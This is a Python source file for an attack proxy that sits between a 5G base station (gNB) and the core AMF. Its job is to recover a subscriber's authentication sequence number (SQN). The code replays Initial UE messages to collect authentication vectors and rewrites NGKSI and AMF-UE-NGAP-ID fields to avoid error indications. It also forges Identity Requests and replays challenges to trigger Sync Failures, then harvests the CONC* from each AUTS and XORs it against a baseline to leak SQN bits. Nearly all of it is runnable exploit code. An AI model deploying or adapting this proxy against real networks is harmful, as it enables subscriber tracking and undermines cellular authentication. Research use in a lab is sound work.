import os
import socket
import threading
import sctp
from pycrate_asn1dir.NGAP import NGAP_PDU_Descriptions
from pycrate_mobile.NAS5G import parse_NAS5G
from copy import deepcopy
import json
from pathlib import Path
from threading import Lock


# Config 
_NGAP_PDU_PROTO = NGAP_PDU_Descriptions.NGAP_PDU

AMF_IP      = os.getenv("AMF_IP","127.0.0.1")
AMF_PORT    = int(os.getenv("AMF_PORT","38412"))
LISTEN_PORT = int(os.getenv("LISTEN_PORT","38412"))


# JSON Config
JSON_FILE = Path("collected.json")
_json_lock = Lock()


# NAS message types
NAS_AUTH_RESPONSE = 0x57
NAS_AUTH_FAILURE = 0x59
NAS_AUTH_REQUEST = 0x56
NAS_IDENTITY_RESPONSE = 0x5c

CAUSE_MAC_FAILURE  = 0x14
CAUSE_SYNC_FAILURE = 0x15
CAUSE_NGKSI_IN_USE = 0x47

# NGAP procedure codes
PROC_INITIAL_UE = 15
PROC_UPLINK_NAS = 46
PROC_DOWNLINK_NAS = 4

# PPID for AMF, else failure
NAS_PPID = 60

# Attack config
N_BITS          = 4
N_SETUP_VECTORS = 2 ** N_BITS  


# NGAP helpers
def NGAP_PDU():
    return deepcopy(_NGAP_PDU_PROTO)


def decode_ngap(data: bytes):
    pdu = NGAP_PDU()
    try:
        pdu.from_aper(data)
        return pdu
    except Exception as e:
        print(f"ERROR - NGAP decode failed: {e}")
        return None

def get_procedure_code(pdu) -> int | None:
    try:
        return pdu.get_val()[1]["procedureCode"]
    except Exception:
        return None

def get_ran_ue_id(pdu) -> int | None:
    try:
        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
        for ie in ies:
            if ie["id"] == 85:
                return ie["value"][1]
    except Exception:
        pass
    return None


def get_nas_msg_type(nas_bytes: bytes) -> int | None:
    try:
        msg, err = parse_NAS5G(nas_bytes)
        if err:
            # print(f"DEBUG parse error: {err}")
            return None
        # print(f"DEBUG NAS raw val: {msg.show()}")
        return msg["5GMMHeader"]["Type"].get_val()
    except Exception as e:
        print(f"ERROR - get_nas_msg_type: {e}")
        return None

def get_nas_msg_fail_cause(nas_bytes: bytes) -> int | None:
    try:
        msg, err = parse_NAS5G(nas_bytes)
        if err:
            return None
        # print(f"DEBUG NAS format: {msg.show()}")

        return msg["5GMMCause"].get_val()[0]
    except Exception:
        return None

def get_nas_pdu(pdu) -> bytes | None:
    try:
        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
        for ie in ies:
            if ie["id"] == 38:
                return ie["value"][1]
    except Exception:
        pass
    return None


def set_nas_pdu(pdu, new_nas: bytes) -> bytes | None:
    try:
        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
        for ie in ies:
            if ie["id"] == 38:
                ie["value"] = (ie["value"][0], new_nas)
                break
        return pdu.to_aper()
    except Exception as e:
        print(f"ERROR - NGAP rebuild failed: {e}")
        return None


# ATTACK FUNCTIONALITY

# AUTS functions to get and record to json
def get_auts(nas_bytes: bytes) -> bytes | None:
    try:
        msg, err = parse_NAS5G(nas_bytes)
        if err:
            return None
        return msg["AUTS"]["V"].get_val()
    except Exception as e:
        print(f"ERROR - AUTS extraction failed: {e}")
        return None

def record_auts(ran_ue_id: int, auts: bytes, j: int, delta: int | None, baseline_hex: str | None):
    entry = {
        "ran_ue_ngap_id": ran_ue_id,
        "j":              j,
        "auts_hex":       auts.hex(),
        "conc_star_hex":  auts[:6].hex(),
        "mac_s_hex":      auts[6:].hex(),
        "delta_hex":      hex(delta) if delta is not None else None,
        "baseline_hex":   baseline_hex,
    }
    
    with _json_lock:
        records = json.loads(JSON_FILE.read_text()) if JSON_FILE.exists() else []
        records.append(entry)
        JSON_FILE.write_text(json.dumps(records, indent=2))
    
    print(f"Recorded AUTS j={j}: {entry}")


# Prevent NGKSI Already in use error by increasing the ID by one every baseline repeat
def increase_ngksi(nas_bytes: bytes) -> bytes | None:
    try:
        msg, err = parse_NAS5G(nas_bytes)
        if err or msg is None:
            return None
        ksi = msg["NAS_KSI"]["NAS_KSI"]["Value"].get_val()
        print(ksi)
        msg["NAS_KSI"]["NAS_KSI"]["Value"].set_val((ksi + 1) % 7)

        print(msg["NAS_KSI"]["NAS_KSI"]["Value"].get_val())
        return msg.to_bytes()

    except Exception as e:
        print(f"ERROR - NGKSI update failed: {e}")
        return None

def increase_ngksi_in_ngap_bytes(ngap_bytes: bytes):
    try:
        pdu = decode_ngap(ngap_bytes)
        if pdu is None:
            print("ERROR - could not decode NGAP")
            return None, None

        nas = get_nas_pdu(pdu)
        if nas is None:
            print("ERROR - NAS-PDU IE not found")
            return None, None

        new_nas = increase_ngksi(nas)
        if new_nas is None:
            print("ERROR - failed to increase NGKSI")
            return None, None

        # Read the new KSI value from the modified NAS bytes
        msg, err = parse_NAS5G(new_nas)
        if err or msg is None:
            print("ERROR - could not re-parse modified NAS")
            return None, None
        new_ksi = msg["NAS_KSI"]["NAS_KSI"]["Value"].get_val()

        rebuilt = set_nas_pdu(pdu, new_nas)
        if rebuilt is None:
            print("ERROR - failed to rebuild NGAP")
            return None, None

        return rebuilt

    except Exception as e:
        print(f"ERROR - increase_ngksi_in_ngap_bytes failed: {e}")
        return None, None


# Prevent ERRORINDICATION by changing the AMF-UE-NGAP-ID to earlier version
def get_amf_ue_ngap_id(pdu) -> int | None:
    try:
        root = pdu.get_val()
        ies = root[1]["value"][1]["protocolIEs"]

        for ie in ies:
            if ie["id"] == 10:  # id-AMF-UE-NGAP-ID
                val = ie["value"]

                # Common pycrate shape: ('AMF-UE-NGAP-ID', 1656)
                if isinstance(val, tuple) and len(val) >= 2:
                    return val[1]

                # Fallback in case it's already an int
                if isinstance(val, int):
                    return val

                print(f"Unexpected AMF-UE-NGAP-ID value format: {val!r}")
                return None

        print("AMF-UE-NGAP-ID IE not found")
        return None

    except Exception as e:
        print(f"ERROR - get_amf_ue_ngap_id failed: {e}")
        return None
    

def set_amf_ue_ngap_id(pdu, new_amf_ue_id: int) -> bytes | None:
    try:
        root = pdu.get_val()
        ies = root[1]["value"][1]["protocolIEs"]

        for ie in ies:
            if ie["id"] == 10:  # id-AMF-UE-NGAP-ID
                old_val = ie["value"]

                # Most common pycrate decoded form
                if isinstance(old_val, tuple) and len(old_val) >= 2:
                    ie["value"] = (old_val[0], new_amf_ue_id)

                # Fallback if decoded form is already plain int
                elif isinstance(old_val, int):
                    ie["value"] = new_amf_ue_id

                else:
                    print(f"ERROR - unexpected AMF-UE-NGAP-ID format: {old_val!r}")
                    return None

                pdu.set_val(root)
                return pdu.to_aper()

        print("ERROR - AMF-UE-NGAP-ID IE not found")
        return None

    except Exception as e:
        print(f"ERROR - set_amf_ue_ngap_id failed: {e}")
        return None
    

# Fabricated Identity Request from Proxy to UE.
def create_identity_request_ngap(ran_ue_id: int, amf_ue_id: int):
    # NAS 5GMM Identity Request
    nas_payload = bytes([0x7e, 0x00, 0x5b, 0x01])
    pdu = NGAP_PDU()
    pdu.set_val(('initiatingMessage', {
        'procedureCode': PROC_DOWNLINK_NAS,
        'criticality': 'ignore',
        'value': ('DownlinkNASTransport', {
            'protocolIEs': [
                {'id': 10, 'criticality': 'reject', 'value': ('AMF-UE-NGAP-ID', amf_ue_id)},
                {'id': 85, 'criticality': 'reject', 'value': ('RAN-UE-NGAP-ID', ran_ue_id)},
                {'id': 38, 'criticality': 'reject', 'value': ('NAS-PDU', nas_payload)}
            ]
        })
    }))
    return pdu.to_aper()


# ATTACK STATE

_attack_state:  dict[int, dict]   = {}   # ran_ue_id → attack phase state
_state_lock = Lock()


def init_attack_state(ran_ue_id: int):
    with _state_lock:
        _attack_state[ran_ue_id] = {
            "phase":      "setup", # "setup" | "idle" | "await_baseline" | "baseline_done" | "await_accept" | "await_sync" | "await_identity_resp"
            "j":          0, # current bit index
            "n":          N_BITS, # total bits to recover (e.g. 32)
            "baseline":   None, # CONC* from first replay
            "deltas":     [], # CONC*_j XOR baseline, gained info per j
            "auth_vectors": [],  # raw NGAP downlink NAS frames, index i = vector i
            "edit_baseline": None, # raw NGAP uplink NAS frame with diff NGKSI
            "amf-id":0, # Needed to not get ErrorIndication since UE and AMF is out of sync
            "_pending_phase": None, # next phase after "await_identity_resp"
        }

def get_state(ran_ue_id: int) -> dict | None:
    with _state_lock:
        return _attack_state.get(ran_ue_id)

def set_phase(ran_ue_id: int, phase: str, **kwargs):
    with _state_lock:
        state = _attack_state.get(ran_ue_id)
        if state:
            state["phase"] = phase
            state.update(kwargs)



# Replay baseline to get the AUTS using the same AK
def send_r0(gnb_sock, ran_ue_id: int, next_phase: str, label: str = "R0,AUTN0"):
    state = get_state(ran_ue_id)
    if not state or not state["edit_baseline"]:
        print(f"ERROR - no auth vectors stored for RAN-UE: {ran_ue_id}")
        return
    print(f"Sending {label} (j={state['j']}) to UE")
    gnb_sock.sctp_send(state["edit_baseline"], ppid=NAS_PPID)
    state["edit_baseline"] = increase_ngksi_in_ngap_bytes(state["edit_baseline"])
    set_phase(ran_ue_id, next_phase)



# Sends the auth request to get Auth response, changing the UE SQN state
def send_auth_vector(gnb_sock, ran_ue_id: int):
    state = get_state(ran_ue_id)
    j     = state["j"]
    idx   = 2 ** j
    vecs  = state["auth_vectors"]
    if idx >= len(vecs):
        print(f"ERROR - no auth vector at index {idx} for j={j} (have {len(vecs)})")
        return
    print(f"Sending R_{{2^{j}}}=vec[{idx}] to UE (j={j})")
    gnb_sock.sctp_send(vecs[idx], ppid=NAS_PPID)



# Proxy threads 
def uplink(gnb_sock, amf_sock):
    """gNB → AMF"""
    while True:
        try:
            # Listener for gNB packets
            fromaddr, flags, data, notif = gnb_sock.sctp_recv(65535)
            if not data:
                print("Uplink: connection closed")
                break
            
            # Decode PDU and retrieve 
            pdu  = decode_ngap(data)
            proc = get_procedure_code(pdu) if pdu else None

            
            # Initial UE Message
            if pdu and proc == PROC_INITIAL_UE:
                ran_ue_id = get_ran_ue_id(pdu)
                print(f"Initial UE Message — RAN-UE-NGAP-ID: {ran_ue_id}")

                if get_state(ran_ue_id) is None:
                    init_attack_state(ran_ue_id)

                state = get_state(ran_ue_id)

                if state["phase"] == "setup":
                    
                    # Resending the Intial UE message to AMF to get needed Auth Requests

                    print(f"Setup: sending Initial UE {N_SETUP_VECTORS}x to AMF")
                    for _ in range(N_SETUP_VECTORS):
                        amf_sock.sctp_send(data, ppid=NAS_PPID)
                    print(f"Setup: {N_SETUP_VECTORS} requests sent, collecting vectors...")
                    
                    # Do NOT forward to UE
                    continue
            
            # Auth response
            if pdu and proc == PROC_UPLINK_NAS:
                ran_ue_id = get_ran_ue_id(pdu)
                nas = get_nas_pdu(pdu)
                state = get_state(ran_ue_id)


                if nas and state:
                    msg_type = get_nas_msg_type(nas)
                    print(f"Uplink msg={msg_type:#x} phase={state['phase']}")


                    # UE anwswer to Identity Request, meaning context is reset
                    if msg_type == NAS_IDENTITY_RESPONSE:
                        if state["phase"] == "await_identity_resp":
                            pending = state.get("_pending_phase", "await_baseline_sync")
                            print(f"Identity Response — resending R0 to resume phase={pending}")

                            # Forward Identity Requst to AMF
                            amf_sock.sctp_send(data, ppid=NAS_PPID)

                            # The context has reset, so sending baseline
                            send_r0(gnb_sock, ran_ue_id,
                                    next_phase=pending,
                                    label="R0 (post-identity-reset)")
                            continue



                    
                    # AUTH RESPONSE
                    if msg_type == NAS_AUTH_RESPONSE:
                        print(f"Auth Response (accepted) — RAN-UE: {ran_ue_id}, phase: {state['phase']}")
                        
                        # UE changed its SQN with Auth Response. Sending baseline to aquire new AUTS.

                        if state["phase"] == "await_baseline_accept":
                            
                            print(f"Auth Response — baseline accepted replaying R0,AUTN0")
                            send_r0(gnb_sock, ran_ue_id,
                                    next_phase="await_baseline_sync",
                                    label="R0,AUTN0 replay (baseline)")
                            continue

                        elif state["phase"] == "await_j_accept":
                           
                            j = state["j"]
                            print(f"Auth Response — j={j} accepted, forwarding to AMF, replaying R0,AUTN0")
                            send_r0(gnb_sock, ran_ue_id,
                                    next_phase="await_j_sync",
                                    label=f"R0,AUTN0 replay (j={j})")
                            continue
                        
                        # Check for Auth response when SYNC Failure expected.
                        elif state["phase"] in ("await_baseline_sync", "await_j_sync"):
                            print("Auth response when not expected")
                            j = state["j"]

                            send_r0(gnb_sock, ran_ue_id,
                                        next_phase="await_j_sync",
                                        label=f"R0,AUTN0 replay (j={j})")
                            continue



                    # AUTH FAILURE
                    if msg_type == NAS_AUTH_FAILURE:
                        failure_cause = get_nas_msg_fail_cause(nas)
                        print(f"Auth Failure cause={failure_cause:#x} phase={state['phase']}")

            
                        # If NGKSI context is used up, respond with a Identity Request/Respond to reset
                        if failure_cause == CAUSE_NGKSI_IN_USE:
                            print(f"NGKSI in use — sending Identity Request to reset")
                            set_phase(ran_ue_id, "await_identity_resp",
                                    _pending_phase=state["phase"])
                            
                            # Create and Send Identity Request to UE
                            pdu_ir = create_identity_request_ngap(ran_ue_id, state["amf-id"])
                            gnb_sock.sctp_send(pdu_ir, ppid=NAS_PPID)
                            continue

                        if state["phase"] in ("await_baseline_sync", "await_j_sync"):

                            if failure_cause == CAUSE_MAC_FAILURE:
                                print(f"MAC Failure — RAN-UE: {ran_ue_id}")
                                
                            # SYNC FAILURE with auts needed
                            elif failure_cause == CAUSE_SYNC_FAILURE:
                                auts = get_auts(nas)
                                if auts:
                                    
                                    # Harvest the CONC* from the AUTS
                                    conc_star = auts[:6]
                                    conc_int  = int.from_bytes(conc_star, "big")

                                    if state["phase"] == "await_baseline_sync":
                                        # This is AUTS' — the baseline concealed SQN.
                                        print(f"Baseline AUTS' CONC*_0: {conc_star.hex()}")
                                        record_auts(ran_ue_id, auts, j=-1,
                                                    delta=None, baseline_hex=None)
                       

                                        set_phase(ran_ue_id, "await_j_accept",
                                                  baseline=conc_int, j=0)
                                        send_auth_vector(gnb_sock, ran_ue_id)

                                    else:  # await_j_sync
                                        j     = state["j"]
                                        delta = conc_int ^ state["baseline"]
                                        state["deltas"].append(delta)
                                        print(f"j={j}: CONC*={conc_star.hex()} δ={delta:#014x}")
                                        record_auts(ran_ue_id, auts, j=j,
                                                    delta=delta,
                                                    baseline_hex=hex(state["baseline"]))
                                        j += 1

                                        # Attack complete. Print result in logs
                                        if j >= state["n"]:
                                            print(f"Attack complete — RAN-UE: {ran_ue_id}")
                                            print(f"Deltas: {[hex(d) for d in state['deltas']]}")
                                            set_phase(ran_ue_id, "idle")
                                        else:
                                            set_phase(ran_ue_id, "await_j_accept", j=j)
                                            send_auth_vector(gnb_sock, ran_ue_id)
                            else:
                                # Failure message that is unexpected
                                print(f"Unexpected failure during replay (cause={failure_cause:#x}), dropping")
                            
                            continue
                        
            amf_sock.sctp_send(data, ppid=NAS_PPID)

        except Exception as e:
            print(f"ERROR - uplink error {type(e).__name__}: {e}")
            break


 # Listener for AMF packets and forwards to gNB
def downlink(gnb_sock, amf_sock):
    """AMF → gNB"""
    while True:
        try:
            fromaddr, flags, data, notif = amf_sock.sctp_recv(65535)
            if not data:
                print("Downlink: connection closed")
                break

            pdu  = decode_ngap(data)
            proc = get_procedure_code(pdu) if pdu else None

            if pdu and proc == PROC_DOWNLINK_NAS:
                ran_ue_id = get_ran_ue_id(pdu)
                nas       = get_nas_pdu(pdu)

                if nas:
                    msg_type = get_nas_msg_type(nas)

                    if msg_type == NAS_AUTH_REQUEST:
                        state = get_state(ran_ue_id)
                        if state is None:
                            init_attack_state(ran_ue_id)
                            state = get_state(ran_ue_id)

                        # Aquire baseline and change the KSI. THe NGAP ID will be repeated for following Auth Req.
                        if state["phase"] == "setup":
                            if state["edit_baseline"] is None:
                                rebuilt = set_nas_pdu(pdu, increase_ngksi(nas))
                                state["amf-id"] = get_amf_ue_ngap_id(pdu)
                                if rebuilt:
                                    state["edit_baseline"] = rebuilt
                                else:
                                    state["edit_baseline"] = data
                                    print("Failed to edit NAS baseline")
                                
                                state["auth_vectors"].append(data)
                            else:
                                new_amf_id = set_amf_ue_ngap_id(pdu, state["amf-id"])
                            
                                state["auth_vectors"].append(new_amf_id)


                            n = len(state["auth_vectors"])
                            print(f"Setup: collected auth vector {n}/{N_SETUP_VECTORS}")

                            if n >= N_SETUP_VECTORS:

                                print(f"Setup complete — sending R0,AUTN0 to UE")
                                set_phase(ran_ue_id, "await_baseline_accept")

                                gnb_sock.sctp_send(state["auth_vectors"][0], ppid=NAS_PPID)

                            continue  

            gnb_sock.sctp_send(data, ppid=NAS_PPID)

        except Exception as e:
            print(f"ERROR - downlink {type(e).__name__}: {e}")
            break

        
           
# Connection handler
def handle(gnb_sctp):
    print(f"gNB connected — opening AMF {AMF_IP}:{AMF_PORT}")
    amf_sctp = sctp.sctpsocket_tcp(socket.AF_INET)

    amf_sctp.connect((AMF_IP, AMF_PORT))

    t1 = threading.Thread(target=uplink,   args=(gnb_sctp, amf_sctp), daemon=True)
    t2 = threading.Thread(target=downlink, args=(gnb_sctp, amf_sctp), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

def main():
    print(f"SQN proxy starting")
    print(f"Listening on 0.0.0.0:{LISTEN_PORT}")
    print(f"Forwarding to AMF {AMF_IP}:{AMF_PORT}")


    server = sctp.sctpsocket_tcp(socket.AF_INET)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen(5)

    while True:
        conn, addr = server.accept()
        print(f"New gNB connection from {addr}")
        t = threading.Thread(target=handle, args=(conn,), daemon=True)
        t.start()

if __name__ == "__main__":
    main()